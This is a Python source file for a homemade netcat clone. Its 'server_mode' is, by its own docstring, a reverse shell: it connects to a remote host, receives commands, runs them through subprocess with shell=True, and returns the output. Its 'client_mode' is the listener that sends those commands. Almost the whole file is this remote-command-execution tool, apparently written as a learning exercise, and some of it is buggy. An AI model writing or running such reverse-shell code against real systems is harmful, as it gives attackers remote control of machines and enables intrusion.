import shlex
import os
import socket
import subprocess
import argparse


def execute(cmd:str)->bytes:
    if not cmd.strip():
        return b"No command received"

    cmd = shlex.split(cmd.strip())
    if "cd" in cmd:
        try:
            os.chdir(cmd[1])
            result = b"0"
        except Exception as e:
            result = f"Something go wrong when trying to change directory:\n    {e}".encode()
    elif "read" in cmd:
        try:
            with open(cmd[1], mode="rb", encoding="utf-8") as f:
                result = f.read()
        except Exception as e:
            result = f"Something go wrong while opening and reading file:\n     {e}".encode()
    elif "touch" in cmd:
        try:
            with open(cmd[1], "wb", encoding="utf-8"):
                result = b"0"
        except Exception as e:
            result = f"Something go wrong while creating file:\n    {e}".encode()
    else:
        try:
            result = subprocess.check_output(cmd, shell=True)
        except Exception as e:
            result = f"Something go wrong exception is:\n   {e}".encode()

    return result


class NetCat:
    def __init__(self, mode, target, port):
        '''
        Nothing interesting simple initializing instance of NetCat with several params

        :param mode: mode in which would run NetCat server/client
        :param target: ipV4 of server to listen on or client to connect to
        :param port: port of server to listen on ro client to connect to
        '''
        self.mode = mode
        self.target = target
        self.port = port
        self.kitty_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def server_mode(self):
        '''
        Okay maybe that's sound disgusting but despite that f called server mode this func realising client (reverse
        server) which would connect to server (reverse client) and will getting commands from server and execute them
        :return: None
        '''
        client = self.kitty_socket
        client.connect((self.target, self.port))
        try:
            while True:
                cwd = os.getcwd()
                client.send(f"{cwd}>>>".encode())
                buffer = b""
                while "\n" not in buffer.decode(DECODING_CONST):
                    part = client.recv(500)
                    buffer = buffer + part

                print(buffer.decode())
                cmd_output = execute(buffer.decode(DECODING_CONST))

                start, stop, step = 0, 500, 500
                while start < len(cmd_output):
                    client.send(cmd_output[start:stop])
                    start, stop = start + step, stop + step
        except KeyboardInterrupt:
            client.close()
            client.shutdown(0)

    def client_mode(self):
        '''
        Despite that f called client mode it will be working like a server which would send a commands to the
        socket called server which normally must be a client
        :return: None
        '''
        server = self.kitty_socket
        server.bind((self.target, self.port))
        server.listen(1)
        connected_client, __ = server.accept()

        try:
            while True:
                cwd = connected_client.recv(500)
                cwd = cwd.strip().decode(DECODING_CONST)
                if not cwd:
                    continue
                cmd = input(f"{cwd} ")
                cmd = cmd + "\n"
                connected_client.send(cmd.encode())

                response = b""
                while True:
                    part = connected_client.recv(500)
                    response = response + part
                    if len(part.decode(DECODING_CONST).strip()) < 500:
                        break
                print(response.decode(DECODING_CONST))
        except KeyboardInterrupt:
            connected_client.close()
            server.close()
            server.shutdown(0)

    def run(self):
        '''
        Function which will start NetCat in specified mode
        
        :return: None
        '''
        if self.mode == "1":
            self.server_mode()
        else:
            self.client_mode()


if __name__ == "__main__":
    DECODING_CONST = "cp866"
    mode = input("Choose mode>> ")
    cat = NetCat(mode=mode, target="localhost", port=8000)
    cat.run()

